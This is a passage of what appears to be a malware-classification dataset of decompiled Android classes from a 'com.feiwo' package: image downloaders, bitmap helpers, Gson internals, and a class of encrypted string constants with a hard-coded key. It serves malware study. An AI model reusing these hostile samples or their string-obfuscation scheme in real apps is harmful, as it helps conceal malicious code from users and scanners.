try {                   fileOutputStream2.close();                 }  catch (                IOException e5) {                   e5.printStackTrace();                 }               }               if (file != null) {               }               if (httpURLConnection != null) {                 httpURLConnection.disconnect();               }               return null;             } catch (            IOException e6) {               e=e6;               e.printStackTrace();               if (fileOutputStream2 != null) {                 try {                   fileOutputStream2.close();                 }  catch (                IOException e7) {                   e7.printStackTrace();                 }               }               if (file != null) {               }               if (httpURLConnection != null) {                 httpURLConnection.disconnect();               }               return null;             }           }  catch (          FileNotFoundException e8) {             e=e8;             fileOutputStream2=null;           } catch (          ConnectException e9) {             e=e9;             fileOutputStream2=null;           } catch (          IOException e10) {             e=e10;             fileOutputStream2=null;           } catch (          Throwable th) {             th=th;             fileOutputStream=null;             if (fileOutputStream != null) {               try {                 fileOutputStream.close();               }  catch (              IOException e11) {                 e11.printStackTrace();                 throw th;               }             }             if (file != null) {             }             if (httpURLConnection != null) {               httpURLConnection.disconnect();             }             throw th;           }         }  catch (        FileNotFoundException e12) {           e=e12;           fileOutputStream2=null;           httpURLConnection=null;         } catch (        ConnectException e13) {           e=e13;           fileOutputStream2=null;           httpURLConnection=null;         } catch (        IOException e14) {           e=e14;           fileOutputStream2=null;           httpURLConnection=null;         } catch (        Throwable th2) {           th=th2;           fileOutputStream=null;           httpURLConnection=null;         }       }       return null;     }  catch (    Throwable th3) {       th=th3;     }   }   @Override public Bitmap doInBackground(  Object... objArr){     this.c=(String)objArr[0];     this.f169b=(String)objArr[1];     this.e=(String)objArr[2];     this.d=(String)objArr[3];     if (this.d == null || !TextUtils.equals(""true"",this.d)) {       this.g=(c)objArr[4];     }  else {       this.h=(d)objArr[4];     }     this.f=(String)objArr[5];     return a(this.c,this.f169b,this.e,this.f);   }   @Override public void onPostExecute(  Bitmap bitmap){     if (this.d == null || !TextUtils.equals(""true"",this.d)) {       if (bitmap == null || bitmap.getHeight() == 0 || bitmap.getWidth() == 0) {         if (this.g != null) {           this.g.a(null,this.c + this.f169b);         }       }  else       if (this.g != null) {         this.g.a(bitmap,this.c + this.f169b);       }     }  else     if (bitmap == null || bitmap.getHeight() == 0 || bitmap.getWidth() == 0) {       if (this.h != null) {         this.h.a(null,this.c + this.f169b);       }     }  else     if (this.h != null) {       this.h.a(new BitmapDrawable(bitmap),this.c + this.f169b);     }     super.onPostExecute(bitmap);   }   @Override public void onProgressUpdate(  Integer... numArr){     super.onProgressUpdate(numArr);   }   @Override protected void onPreExecute(){     super.onPreExecute();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.b\c.code","public interface c {   void a(  Bitmap bitmap,  String str); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.b\d.code","public interface d {   void a(  Drawable drawable,  String str); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.b\e.code","public class e {   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * f) + 0.5f);   }   public static Bitmap a(  Bitmap bitmap,  int i,  int i2){     return Bitmap.createScaledBitmap(bitmap,i,i2,true);   }   public static Bitmap a(  Drawable drawable){     Bitmap createBitmap=Bitmap.createBitmap(drawable.getIntrinsicWidth(),drawable.getIntrinsicHeight(),drawable.getOpacity() != -1 ? Bitmap.Config.ARGB_8888 : Bitmap.Config.RGB_565);     Canvas canvas=new Canvas(createBitmap);     drawable.setBounds(0,0,drawable.getIntrinsicWidth(),drawable.getIntrinsicHeight());     drawable.draw(canvas);     return createBitmap;   }   public static Drawable a(  Drawable drawable,  float f){     int intrinsicWidth=drawable.getIntrinsicWidth();     int intrinsicHeight=drawable.getIntrinsicHeight();     Bitmap a2=a(drawable);     Matrix matrix=new Matrix();     matrix.postRotate(f);     return new BitmapDrawable(Bitmap.createBitmap(a2,0,0,intrinsicWidth,intrinsicHeight,matrix,true));   }   public static ScreenSize a(  Context context,  int i,  int i2){     ScreenSize d=t.d(context);     ScreenSize screenSize=new ScreenSize();     float f=i / i2;     if (d.getScreenWidth() < d.getScreenHeight()) {       if (i > d.getScreenWidth()) {         i=d.getScreenWidth();       }       i2=(int)(i / f);     }     screenSize.setScreenWidth(i);     screenSize.setScreenHeight(i2);     return screenSize;   }   public static String[] a(  String str,  String str2){     int i;     int abs;     String[] split=str.split(""\\*"");     String str3=split[0];     String str4=split[1];     String[] split2=str2.split("";"");     int i2=Integer.MAX_VALUE;     String str5=null;     int length=split2.length;     int i3=0;     while (i3 < length) {       String str6=split2[i3];       String[] split3=str6.split("":"");       if (split3 == null || split3.length < 2 || (abs=Math.abs(Integer.parseInt(split3[0].split(""\\*"")[0]) - Integer.parseInt(str3))) >= i2) {         str6=str5;         i=i2;       }  else {         i=abs;       }       i3++;       i2=i;       str5=str6;     }     return str5.split("":"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.b\f.code","public class f {   public static Drawable a(  Context context,  String str){     try {       return new BitmapDrawable(context.getResources().getAssets().open(str));     }  catch (    IOException e) {       e.printStackTrace();       return null;     }   }   public static android.graphics.Bitmap b(  android.content.Context r3,  java.lang.String r4){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.i.b.f.b(android.content.Context, java.lang.String):android.graphics.Bitmap"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.b\g.code","public class g {   public static StateListDrawable a(  Context context,  String str,  String str2,  String str3,  String str4){     StateListDrawable stateListDrawable=new StateListDrawable();     Drawable a2=TextUtils.isEmpty(str) ? null : f.a(context,str);     Drawable a3=TextUtils.isEmpty(str2) ? null : f.a(context,str2);     Drawable a4=TextUtils.isEmpty(str3) ? null : f.a(context,str3);     Drawable a5=TextUtils.isEmpty(str4) ? null : f.a(context,str4);     stateListDrawable.addState(new int[]{R.attr.state_pressed,R.attr.state_enabled},a3);     stateListDrawable.addState(new int[]{R.attr.state_enabled,R.attr.state_focused},a4);     stateListDrawable.addState(new int[]{R.attr.state_enabled},a2);     stateListDrawable.addState(new int[]{R.attr.state_focused},a4);     stateListDrawable.addState(new int[]{R.attr.state_window_focused},a5);     stateListDrawable.addState(new int[0],a2);     return stateListDrawable;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.c\a.code","public class a {   public static String f170a=a(""769207C399ED9E0A"");   public static String f171b=a(""4A996137EDDC4C5E"");   public static final String c=a(""589F01022F29934C"");   public static final String d=a(""5D2000E1680D9086"");   public static final String e=a(""323642875B0C28C9"");   public static final String f=a(""AE06A0C6E5580C02"");   public static final String g=a(""36E911060958532925CFD36B53B08803"");   public static final String h=a(""6ABDA4A4218AB4BA"");   public static final String i=a(""D4857A892F541227"");   public static final String j=a(""0C17FA45321DB079"");   public static final String k=a(""7251C76277B721E8675CBE6E79E4727E"");   public static final String l=a(""329F939B2D6ABCFFE896C01524195751"");   public static final String m=a(""F122059683C2325CBF4F34DB6FF8375D0298265093F2E4EF8874D4008900B8F081C0C5B1AB6502B9"");   public static final String n=a(""AA1C3DF4775A05CF477528CD5E2A064A4ACA78DF283EC8CE0B7B7E0CB15BF3535B9AF6CC94EFFB4F6DD010233B0FC41D"");   public static final String o=a(""72A2F5AEE81AC2E41A8AEE39D628FFF7"");   public static final String p=a(""6B282A411F2197E7A188C9B513DD02F0"");   public static final String q=a(""6A16652001172A9635B5DC8C5E27BC35"");   public static final String r=a(""28A7140F7D4280FE60A565C10116925F"");   public static final String s=a(""28A7140F7D4280FEB0A81609737EB1945E2164F76AC2D9C4"");   public static final String t=a(""23EECF9E3F1457EA70DD8E4B8CC1C6F0"");   public static final String u=a(""23EECF9E3F1457EAADB41285AD7008C6"");   public static final String v=a(""23EECF9E3F1457EA0A734B71DE09F23A"");   public static final String w=a(""292558F1FB96848DB067BCB6581E75A7"");   public static final String x=a(""89CFB3F037B9ADF3"");   public static final String y=a(""177BB056439C6F065B4279664ABFCD11"");   public static final String z=a(""BFECEA30EE5785B02E4705A2EF6319D3"");   public static final String A=a(""83E3F8B0744D634B840C9EC28A4A6B6EBF6F12FF2B00205C7728CA04B3F34EAC"");   public static final String B=a(""5AAE8C551D205383E276889897E9CF5BE7B00327CB27BDDDB067BCB6581E75A7"");   public static final String C=a(""B0508E515AF7DA80AB8E083C07353329B51941AA8CBF583EE0C6A202AF61F322"");   public static final String D=a(""A3743928EEB696668BABBB870E28C800C76CF747E1190F98"");   public static final String E=a(""E6E6CA4098ECF7475DBCDA81DE5D149A"");   public static final String F=a(""B7A6F40F7CAA521EC7863B25881B70B09EDB43472177994B2008FC55EFFFB162"");   public static final String G=a(""739D4543BFC0DAB1407B581D8982BDEE"");   public static final String H=a(""661BC265D73FFED4167953EB1B578748171BEC3ACA420713AB60D0899B6F929D7FBE24FD77827074"");   public static final String I=a(""2FED34C94223F32AFE1D63D899D4B7E41C3403E645606C679E3A89A747830624344D317B5AD371165F1AAD5D57A862F66779A33745AD5E8B"");   public static final String J=a(""55C7D2810A05321DDE183E287C19BFF4"");   public static final String K=a(""4E15DCD866952481B9E28DE97B3AFA55ADB64429AC866643"");   public static final String L=a(""8C80C6F09FD632B08C82CF935829FE2D32B49E11B8C1F6A6"");   public static final String M=a(""79F13431BC6A3143D24912A9AEF06252E38BBCFBD1ED9C60"");   public static final String N=a(""B2E074E5D00B5D8F8C82CF935829FE2D32B49E11B8C1F6A6"");   public static final String O=a(""B801196B47A88E5CCF2039776D576CD1"");   public static final String P=a(""AC72D165F5FFEA34B54ADE6C3274E93E"");   public static final String Q=a(""BA785361CFF51EFE0D3C0377442E0BF918647F877CC5228269B7021C2D88F15E0141F7429DAD74AE"");   public static final String R=a(""7F299E89952E12C1CED7AFE13C042CF48EBCD664EFEFEA02D34BAB8C7F2717627FB6B9EE6A67EA3D70C4575DBAEAB03C27D3F8789F3A6F95"");   public static final String S=a(""AFC0F5B45C8882A9"");   public static final String T=a(""672854F83EDB3AA091763E7326DD1EB2"");   public static final String U=a(""6F6DAFF593A26C21B067BCB6581E75A7"");   public static final String V=a(""0BFA607C5339A5813D0F3886B73AA34457420A7A11B7CB466820FBA515E6DB53E835C99B0555C1EC"");   public static final String W=a(""D9073ED249E4ADFDB067BCB6581E75A7"");   public static final String X=a(""A4C9413114C4B6DD53C5CADBAD5F4B3F"");   public static final String Y=a(""72A2F5AEE81AC2E41A8AEE39D628FFF7"");   public static final String Z=a(""177BB056439C6F06A14DF9F68F2E273FAD2028B9BA337D47"");   public static final String aa=a(""42D5CEA29AAECF53CF2039776D576CD1"");   public static final String ab=a(""DF5A29E00ED34BEA25F62005C95C490CF0FBEF11CD7C1557"");   public static final String ac=a(""5FF2CC311F3221AAEA2012FA1BCBB730"");   public static final String ad=a(""3A9F72D1F1299D6F14C564BAC9551128"");   public static final String ae=a(""2256E5D0F0D60E24B4327DB3030E3B6B"");   public static final String af=a(""CEF362A14BEB47F97947A3759EA7D137"");   public static final String ag=a(""21FDE8A9EE206EB28B318FFB1662AD64"");   public static final String ah=a(""654CBC709D79C8DF31D9EA97EC821A06"");   public static final String ai=a(""32C4F781A80963A3"");   public static final String aj=a(""7FB146D07AF8F047B067BCB6581E75A7"");   public static final String ak=a(""D72C98C20D96BB40B067BCB6581E75A7"");   public static final String al=a(""99B32B70775972AA"");   public static final String am=a(""B15C3A0331035719"");   public static final String an=a(""A23730C27DF6CDF0D5C2AD3864D6D9FE"");   public static final String ao=a(""60CF5076E8C280BC"");   public static final String ap=a(""513A04F4A9A784AB858D38151ED3D503846A03BE451595A5"");   public static final String aq=a(""3D24F52AA0741868B48157A95A4B63565952B409E93479E4"");   public static final String ar=a(""513A04F4A9A784AB0DE0964ABBA58770DA4AD948F2687E2BBFFB7BC9C7FA416D"");   public static final String as=a(""DFADA066EA5898070BD882258682D799FEE55BAD39E8CBD82EB9158251AC6834"");   public static final String at=a(""95AA8B49684B75D9D4A5DF62044392E2BFFB7BC9C7FA416D"");   public static final String au=a(""A247BB3872C227596D6B2697BCB046D1"");   public static final String av=a(""F3B557CAD2B11534D96A83E7278979A8220785AAFAFFA78CB9DEB8CF8110AE95E1902FD651068AC0B067BCB6581E75A7"");   public static final String aw=a(""07848CA14346B4FC61249FD0008B70543CFBA1DA9A1A4A5E"");   public static final String ax=a(""DCA3A30F28EE5731C909208CBA83E77C500FC4142D72D29D5952B409E93479E4"");   public static final String ay=a(""07848CA14346B4FC61249FD0008B7054713C8322B0180EF65952B409E93479E4"");   public static final String az=a(""DFADA066EA5898070BD882258682D799D5D8B640E05A13180EA169B78D46390C"");   public static final String aA=a(""75E81339B12BE0B632EF89F7C337A14F2BD7B17C7F6C0A902EB9158251AC6834"");   public static final String aB=a(""150F114245102C72CE7CCE59187F4D91DC657B58AF94A803B067BCB6581E75A7"");   public static final String aC=a(""150F114245102C728C730C51019C8EB9EB718B7C45D9C1CFDC657B58AF94A803B067BCB6581E75A7"");   public static final String aD=a(""A2041FD9CA0E03C97517E4C55F8C9249BD1B3530A04F924CA41A44C30C3548C4B067BCB6581E75A7"");   public static final String aE=a(""150F114245102C728BEADE25B8DA45575952B409E93479E4"");   public static final String aF=a(""150F114245102C728C730C51019C8EB9FF4C733C4C5A17BF5952B409E93479E4"");   public static final String aG=a(""755A6A23B95BADC2EEDF1BA7BE063F2A5952B409E93479E4"");   public static final String aH=a(""666FB507214EFB42E4839DB258131DCB"");   public static final String aI=a(""AB253ADD550E68E0"");   public static final String aJ=a(""DB1E644AE14DD49F43B5DCC1A50485C4C2944FB601A86EE917DA54F9A46E89BB19E03197E34E3114"");   public static final String aK=a(""8D2493F8AE70EF9F4DCE3F560781CBD9707E3B85DA260645FE5B72FDD7D8D420"");   public static final String aL=a(""1B6FC0E4A4B204918ABF88F01CB2365E309A7FACC578281459A0748AB89DBA8CA111CF507B675909"");   public static final String aM=a(""C7D114C4628747E625F62005C95C490CCA3C44EE166B7131"");   public static final String aN=a(""1FC3552D3BA66532"");   public static final String aO=a(""1BB311529152A62E082AE76C99BB3F6B01406738787129CA"");   public static final String aP=a(""439DBE331C33FB0225F62005C95C490C87BADEC7C386BAEE"");   public static final String aQ=a(""695C8C456FB67E6ACF9DED7F74EB9796C39343AB0B60864E"");   public static final String aR=a(""64A3A782991367BE78810135245A60521FF4E22EFFB41734"");   public static final String aS=a(""F82C530ACC01C6E836AE5C65D9034293"");   public static final String aT=a(""1FAB3999F124EEFF66DD28960A5B6A45DF1977D7DAAAA1068D4470A7C3491455FAB487527134D31B"");   public static final String aU=a(""30986CB93F53E5CFA64B927A0B6EDDC3292978B614FA10B4824BC0CE444E2189"");   public static final String aV=a(""1E932B13B86913FB0B3451531EFF10E6"");   public static final String aW=a(""24493E19BB38E51C8E4E57C19DCCEBDA"");   public static final String aX=a(""FE5B72FDD7D8D420"");   public static final String aY=a(""F8077498CA03F4E2"");   public static final String aZ=a(""547953A3386C0D4B66B71449EBE3AF58"");   public static final String ba=a(""BB62E77881185B7866B71449EBE3AF58"");   public static final String bb=a(""5BD67B4DC388F3AC"");   public static final String bc=a(""4446831A0F43EEACB12F1E8E5A8E6532065BAA31F2E44EEFE23A4C01DCB3619F6A069C7900517368B067BCB6581E75A7"");   public static final String bd=a(""8D4A93F2B2AF5A8C21002FFC0E88CED431FBE335C8E48A69EBC81049DE5BC31CE1AAA04B690BD9FD7099AAE72066132C175DA6341598AA10AD9F2302F08060E0B067BCB6581E75A7"");   public static final String be=a(""8D4A93F2B2AF5A8C59AF1BE5099D198C31FBE335C8E48A696FA7B10D579EF98411C1230F42A43B227099AAE72066132C175DA6341598AA10AD9F2302F08060E0B067BCB6581E75A7"");   public static final String bf=a(""F57199ED13DDE010BEA5F833B34EBB1948196CEBD23BECC6D19CBF22BC0DBA1E25FB9C91A754F3C5"");   public static final String bg=a(""6147CEDC649F8F04E6BB2785DC1D759DDA739993DCD3AC9E"");   public static final String bh=a(""CFDF2ACA11D15AED99BD44F71F6E079B"");   public static final String bi=a(""DA44B22E307CC15D1B616E2F60F4151BF9AE32D4AD62EBE834B88B688081D899B067BCB6581E75A7"");   public static final String bj=a(""DA44B22E307CC15D1B616E2F60F4151B89260F3DE15A137AF03FCACD4704AC092EB9158251AC6834"");   public static final String bk=a(""DA44B22E307CC15D1B616E2F60F4151BC351CCEE2ED3A410E5A3713D9739D3FE"");   public static final String bl=a(""F5CC949C1449A8CF"");   public static final String bm=a(""1F7153C440F87AFBEFA7319C67D645BE6DD010233B0FC41D"");   public static final String bn=a(""BF36FEDEAE51CD512EC6A552FB0C8390BFCA5D9A89F8B7D607E0B4F48113F52F19178084B5A34E5F"");   public static final String bo=a(""30B3C8C6A6D4B1C2A6B3ECA995F38BAB583275CFCFB83FE6EDD161B04A0C5CAC4F86CBF674BF2A7A"");   public static final String bp=a(""BF36FEDEAE51CD519C30FF1E21A939C6C71FCFE4C076F73FADA13C5C66AA520A"");   public static final String bq=a(""BF36FEDEAE51CD519C30FF1E21A939C6C71FCFE4C076F73F2FFE19A70C809CBA3D64E794F47E74B8B067BCB6581E75A7"");   public static final String br=a(""BF36FEDEAE51CD519C30FF1E21A939C65128BE7110C8E513BF3534FFC59D5AA44ABA4854DD89FE38C7D4425056536892"");   public static final String bs=a(""5290185C942D03CBEAFF5A1B472153A364859F69EA59A41B04079AC886F05BF792C47C1C4E88CD60F1BBFF69D2B79DD44FAC8A5B5F8C22BA"");   public static final String bt=a(""4EFCF0E4E441F9B71966D48759C53EEC903411455F3A5F375C2477BEB0BE3BE34A7E6C8DD856CEC0B067BCB6581E75A7"");   public static final String bu=a(""4EFCF0E4E441F9B71966D48759C53EEC767ED003A90EA7885C2477BEB0BE3BE33D707004AB7D8E86"");   public static final String bv=a(""880A4B623A18C1F51D42D3169583924F725E84C3E4DC96A96B6A15E58055CF7C8EB094654997CF96"");   public static final String bw=a(""5DD8872732CBC9D22D37E64DDB5C79C67130E0A7A5659D07082FCD1CF143078E"");   public static final String bx=a(""C5C78F183BCF5A694EFCF0E4E441F9B71966D48759C53EEC5BBD5C6005FC843550384145C10027D7A23594C933179311FB3D58EE4D7F383E"");   public static final String by=a(""B72635B5471A5C641A8AEE39D628FFF7"");   public static final String bz=a(""F70F15E182EC6427"");   public static final String bA=a(""EE65EC98200EE352"");   public static final String bB=a(""B15C3A0331035719"");   public static final String bC=a(""603818D817C2370F"");   public static final String bD=a(""3A9A0E9841B10E3E"");   public static final String bE=a(""B0A34390B7694B5E9ECAB17FA28B6A49"");   public static final String bF=a(""8DD6AC59F53A9AAEB067BCB6581E75A7"");   public static final String bG=a(""5B86289DF3B3E75E1D56C0528728CCA6"");   public static final String bH=a(""5B86289DF3B3E75EB52D5DD8E7B3B09C2A28476DDC84758B"");   public static final String bI=a(""07F21F146438163C"");   public static final String bJ=a(""F16B3B30CF87BAA6"");   public static final String bK=a(""47E27527D25043FFA8B92AE9B9208EEC"");   public static final String bL=a(""06A15201553412BA7CF2BBB60FD8FF020893BD69B97C3545DDB2CB52518CDFE783CE957569B4C605297E0D6B50157213CE9368B030B9479A7CE35B358E8E38240A135121ABE8E42B96F573A5116FE0207702EBD599859DB79354EF6EB1B724449AFD08C49493DBBF0CFF119A39E81283"");   public static final String bM=a(""DEEE898A87BEC92F5F6C0ED4A0E797243F9D147CC6B81F4345769B6148E25D59576A75B98BB2415D"");   public static final String bN=a(""4BC8C0AFBA385CD26BDDB34988B97EB4A8EA622A446DFA874F6B84884F85A694B067BCB6581E75A7"");   public static final String bO=a(""3CE89EC5EB26167F3B9B1EC879809A64BE6C5741950DEDE3995D52C96E1940E26C6530B6453179B7E26DFA457DAD3E22"");   public static final String bP=a(""4FAEF79767B21748D7ACDD91373DCAC2F3FD8C9249B377C584558F76BC3C89DA4F2468CE634F49895295442F93B1FFC2"");   public static final String bQ=a(""98D6D7638B96A33C8C196CA09591072CE7B6686C6CF0DF64C73F210EB450F824"");   public static final String bR=a(""A4C9413114C4B6DDE16720FF67E33B7A9742CB1DA95C640C48A715F18EA83DA1A57F2F49E250A2512ADEA5EE8F3F17F7BE73C0B0B500D8D7ED541DD6E160C21F"");   public static final String bS=a(""1DC17C9282D87E35BEC95FA9E4111FCA640885398D66F74B"");   public static final String bT=a(""19DABB16329DDDE94128C6CE00ED334A051BABC5BAB629AD"");   public static final String bU=a(""365E3E1C7D5D3D7186E1EE9937B2A9A9"");   public static final String bV=a(""377854E8F4BAFE43C1BD89CFFBB60A02"");   public static final String bW=a(""2137D4A7BD8B0D2C72F7EA32BC1BE8BD1160716D007A7BC541814CB92A320832EB2DD318FD78697C59893E678B91FC1A14C800DE2B5DAA06A9A21AC11D1CA37C52B20E392B479F68"");   public static final String bX=a(""2137D4A7BD8B0D2C72F7EA32BC1BE8BD1160716D007A7BC541814CB92A320832EB2DD318FD78697C92097C9E90F08DB617D683FD2A83B862E9DE6CDB32FF29BBC6C24D977E718828F66CAF21C336B392B067BCB6581E75A7"");   public static final String bY=a(""2137D4A7BD8B0D2C72F7EA32BC1BE8BD1160716D007A7BC541814CB92A320832EB2DD318FD78697CD5FB134601154C804F240F17539ADAF4ABA71F62E95C02F97D26C98671B87250"");   public static final String bZ=a(""F48F175665201AD91F4BB3F8FE4C45A0"");   public static final String ca=a(""F122059683C2325C076DF9B43CAA8371"");   public static final String cb=a(""F0B7CD80A20012AB44D84DE625C770A4"");   public static final String cc=a(""2D8615EDD1E301BCBABB6D2E919C9594"");   public static final String cd=a(""F3B557CAD2B11534D96A83E7278979A8FF8D6D6A33D203688E084FFD177512255952B409E93479E4"");   public static final String ce=a(""F3B557CAD2B11534D96A83E7278979A886F15C95BA88D5DDD85D0F2765F7187C"");   public static final String cf=a(""F3B557CAD2B11534D96A83E7278979A886F15C95BA88D5DDC473BFAF36EE3BDD"");   public static final String cg=a(""F3B557CAD2B11534D96A83E7278979A886F15C95BA88D5DDD606E52B522AFBDC"");   public static final String ch=a(""F3B557CAD2B11534D96A83E7278979A886F15C95BA88D5DD9EB89714C0D488FD"");   public static final String ci=a(""F3B557CAD2B11534D96A83E7278979A80CC5D7672040F7DB50F8A5F7A820DF5A"");   public static final String cj=a(""F3B557CAD2B11534D96A83E7278979A8C90206BCE05CFD1ABD5E5EA5018733D3C39343AB0B60864E"");   public static final String ck=a(""B72635B5471A5C64E4E9294BCC06D62A"");   public static final String cl=a(""FFC2A6CC900EFBB96D488E7C817732388C6803DD7B21EBB34D2AC29D06BD7BCC"");   public static final String cm=a(""29543AE938F29BD08575627359B3CCA3B1E7DD7E13CBB4A4"");   public static final String cn=a(""29543AE938F29BD08DD3D06372A6B42BFC8C157DB62DAE57"");   public static final String co=a(""29543AE938F29BD0E27E9EA5E9809D52"");   public static final String cp=a(""29543AE938F29BD0FB0A8F27102E4255B067BCB6581E75A7"");   public static final String cq=a(""BCFA55F524ED96203FA1DFC3F1262EC6"");   public static final String cr=a(""F3B557CAD2B11534D96A83E7278979A8714257815A2D15FB9B0A21348320EFD0"");   public static final String cs=a(""F3B557CAD2B11534D96A83E7278979A8CBCC484D073727123287671986273267"");   public static final String ct=a(""807F4E06801EEEB7176A645D1D280B3A"");   public static final String cu=a(""C4F1178DA2E3357E1C8566242479F7D816E49146C8C42F28"");   public static final String cv=a(""18F9FFA7625960FC822AAB507C7EEAAD"");   public static final String cw=a(""003FC02E46E077376D6B2697BCB046D1"");   public static final String cx=a(""F3B557CAD2B11534D96A83E7278979A8D8DDE21197B8E375E5A3713D9739D3FE"");   public static final String cy=a(""350113DFF1E5135420FBADFE6408CA9F"");   public static String a(  String str){     if (TextUtils.isEmpty(c.f172a)) {       return str;     }     try {       return c.a(str,c.f172a);     }  catch (    Exception e2) {       return str;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.c\b.code","public class b {   public static String a(){     return com.feiwo.c.a.m[com.feiwo.c.a.l];   }   public static String a(  String str){     String[] split=str.split("","");     return split[new Random().nextInt(split.length)];   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.c\c.code","public class c {   public static String f172a=""iddc8jlva3k1qrezdut9"";   public static java.lang.String a(  java.lang.String r7,  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.i.c.c.a(java.lang.String, java.lang.String):java.lang.String"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.c\d.code","public class d {   public static SpannableStringBuilder a(  String str,  int i){     return new SpannableStringBuilder(str);   }   public static SpannableStringBuilder a(  String str,  int i,  String str2){     SpannableStringBuilder spannableStringBuilder=new SpannableStringBuilder(str);     spannableStringBuilder.setSpan(new ForegroundColorSpan(i),str.length() - str2.length(),str.length(),33);     return spannableStringBuilder;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\AppendableWriter.code","final class AppendableWriter extends Writer {   private final Appendable appendable;   private final CurrentWrite currentWrite; class CurrentWrite implements CharSequence {     char[] chars;     CurrentWrite(){     }     @Override public char charAt(    int i){       return this.chars[i];     }     @Override public int length(){       return this.chars.length;     }     @Override public CharSequence subSequence(    int i,    int i2){       return new String(this.chars,i,i2 - i);     }   }   private AppendableWriter(  Appendable appendable){     this.currentWrite=new CurrentWrite();     this.appendable=appendable;   }   @Override public void close(){   }   @Override public void flush(){   }   @Override public void write(  int i){     this.appendable.append((char)i);   }   @Override public void write(  char[] cArr,  int i,  int i2){     this.currentWrite.chars=cArr;     this.appendable.append(this.currentWrite,i,i + i2);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\C$Gson$Preconditions.code","public final class C$Gson$Preconditions {   public static void checkArgument(  boolean z){     if (!z) {       throw new IllegalArgumentException();     }   }   public static <T>T checkNotNull(  T t){     if (t == null) {       throw new NullPointerException();     }     return t;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal\C$Gson$Types.code","public final class C$Gson$Types {   static final Type[] EMPTY_TYPE_ARRAY=new Type[0]; public final class GenericArrayTypeImpl implements Serializable, GenericArrayType {     private static final long serialVersionUID=0;     private final Type componentType;     public GenericArrayTypeImpl(    Type type){       this.componentType=C$Gson$Types.canonicalize(type);     }     public boolean equals(    Object obj){       return (obj instanceof GenericArrayType) && C$Gson$Types.equals(this,(GenericArrayType)obj);     }     @Override public Type getGenericComponentType(){       return this.componentType;     }     public int hashCode(){       return this.componentType.hashCode();     }     public String toString(){       return C$Gson$Types.typeToString(this.componentType) + ""[]"";     }   } public final class ParameterizedTypeImpl implements Serializable, ParameterizedType {     private static final long serialVersionUID=0;     private final Type ownerType;     private final Type rawType;     private final Type[] typeArguments;     public ParameterizedTypeImpl(    Type type,    Type type2,    Type... typeArr){       boolean z=true;       if (type2 instanceof Class) {         Class cls=(Class)type2;         C$Gson$Preconditions.checkArgument(type != null || cls.getEnclosingClass() == null);         if (type != null && cls.getEnclosingClass() == null) {           z=false;         }         C$Gson$Preconditions.checkArgument(z);       }       this.ownerType=type == null ? null : C$Gson$Types.canonicalize(type);       this.rawType=C$Gson$Types.canonicalize(type2);       this.typeArguments=(Type[])typeArr.clone();       for (int i=0; i < this.typeArguments.length; i++) {         C$Gson$Preconditions.checkNotNull(this.typeArguments[i]);         C$Gson$Types.checkNotPrimitive(this.typeArguments[i]);         this.typeArguments[i]=C$Gson$Types.canonicalize(this.typeArguments[i]);       }     }     public boolean equals(    Object obj){       return (obj instanceof ParameterizedType) && C$Gson$Types.equals(this,(ParameterizedType)obj);     }     @Override public Type[] getActualTypeArguments(){       return (Type[])this.typeArguments.clone();     }     @Override public Type getOwnerType(){       return this.ownerType;     }     @Override public Type getRawType(){       return this.rawType;     }     public int hashCode(){       return (Arrays.hashCode(this.typeArguments) ^ this.rawType.hashCode()) ^ C$Gson$Types.hashCodeOrZero(this.ownerType);     }     public String toString(){       StringBuilder sb=new StringBuilder((this.typeArguments.length + 1) * 30);       sb.append(C$Gson$Types.typeToString(this.rawType));       if (this.typeArguments.length == 0) {         return sb.toString();       }       sb.append(""<"").append(C$Gson$Types.typeToString(this.typeArguments[0]));       for (int i=1; i < this.typeArguments.length; i++) {         sb.append("", "").append(C$Gson$Types.typeToString(this.typeArguments[i]));       }       return sb.append("">"").toString();     }   } public final class WildcardTypeImpl implements Serializable, WildcardType {     private static final long serialVersionUID=0;     private final Type lowerBound;     private final Type upperBound;     public WildcardTypeImpl(    Type[] typeArr,    Type[] typeArr2){       C$Gson$Preconditions.checkArgument(typeArr2.length <= 1);       C$Gson$Preconditions.checkArgument(typeArr.length == 1);       if (typeArr2.length != 1) {         C$Gson$Preconditions.checkNotNull(typeArr[0]);         C$Gson$Types.checkNotPrimitive(typeArr[0]);         this.lowerBound=null;         this.upperBound=C$Gson$Types.canonicalize(typeArr[0]);         return;       }       C$Gson$Preconditions.checkNotNull(typeArr2[0]);       C$Gson$Types.checkNotPrimitive(typeArr2[0]);       C$Gson$Preconditions.checkArgument(typeArr[0] == Object.class);       this.lowerBound=C$Gson$Types.canonicalize(typeArr2[0]);       this.upperBound=Object.class;     }     public boolean equals(    Object obj){       return (obj instanceof WildcardType) && 